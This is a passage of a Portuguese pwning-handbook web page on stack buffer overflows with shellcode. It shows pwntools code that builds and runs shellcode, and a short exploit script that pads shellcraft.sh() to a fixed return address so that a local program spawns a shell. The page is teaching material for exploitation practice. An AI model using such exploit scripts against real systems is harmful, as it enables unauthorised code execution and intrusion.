<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Gerar shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> asm</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Ver bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;Shellcode: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">shellcode</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> bytes&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexdump</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Ver instruções</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\nInstruções Assembly:&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">disasm</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Executar (run_shellcode())</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> run_shellcode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="sumário-de-uso-bof-shellcode">Sumário de uso BOF Shellcode<a href="#sumário-de-uso-bof-shellcode" class="hash-link" aria-label="Direct link to Sumário de uso BOF Shellcode" title="Direct link to Sumário de uso BOF Shellcode" translate="no">​</a></h2>
<p>Basicamente:</p>
<ol>
<li class="">Identifique se é possível fazer BOF</li>
<li class="">Coloque o <strong>Shellcode no Input</strong> + <strong>Padding até <code>return address</code></strong> + <strong>Endereço do início do Shellcode na stack</strong></li>
<li class="">Sim, acabamos de mandar o <code>RIP</code> executar instrução na stack.</li>
</ol>
<p>Exemplo com pwntools, abrindo uma shell (<code>shellcraft.sh()</code>):</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./program&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> asm</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sh</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic">## Shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">312</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;A&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">## Padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xffffcfb4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic">## Endereço do Shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">clean</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/manual-pwning/docs/pwning/bof/2-2-bof-callfunction"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Buffer Overflow - Return Address</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/manual-pwning/docs/pwning/format-strings"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Format Strings</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#o-que-colocar-no-shellcode" class="table-of-contents__link toc-highlight">O que colocar no shellcode?</a></li><li><a href="#syscalls" class="table-of-contents__link toc-highlight">Syscalls</a><ul><li><a href="#execve---executar-shellprograma" class="table-of-contents__link toc-highlight">execve - Executar Shell/programa</a></li><li><a href="#file-descriptors-fd" class="table-of-contents__link toc-highlight">File Descriptors (fd)</a></li><li><a href="#write---saídaescrita" class="table-of-contents__link toc-highlight">write - Saída/Escrita</a></li><li><a href="#read---entradaleitura" class="table-of-contents__link toc-highlight">read - Entrada/Leitura</a></li><li><a href="#open---abrir-arquivos" class="table-of-contents__link toc-highlight">open - Abrir arquivos</a></li><li><a href="#exit---saída-controlada" class="table-of-contents__link toc-highlight">exit - Saída controlada</a></li><li><a href="#dup2---redirecionamento" class="table-of-contents__link toc-highlight">dup2 - Redirecionamento</a></li><li><a href="#socket--connect---reverse-shell" class="table-of-contents__link toc-highlight">socket + connect - Reverse Shell</a></li><li><a href="#combinações-de-syscalls" class="table-of-contents__link toc-highlight">Combinações de Syscalls</a></li><li><a href="#outras-syscalls" class="table-of-contents__link toc-highlight">Outras Syscalls</a></li></ul></li><li><a href="#nops" class="table-of-contents__link toc-highlight">NOPs</a></li><li><a href="#criando-um-shellcode" class="table-of-contents__link toc-highlight">Criando um Shellcode</a></li><li><a href="#shellcode--pwntools" class="table-of-contents__link toc-highlight">ShellCode + pwntools</a></li><li><a href="#sumário-de-uso-bof-shellcode" class="table-of-contents__link toc-highlight">Sumário de uso BOF Shellcode</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Aprenda</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/manual-pwning/docs/intro">HandBook</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Comunidade</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://discord.gg/pFSq368vu7" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Mais</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/ariiialves/manual-pwning" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div></div></footer></div>
</body>
</html>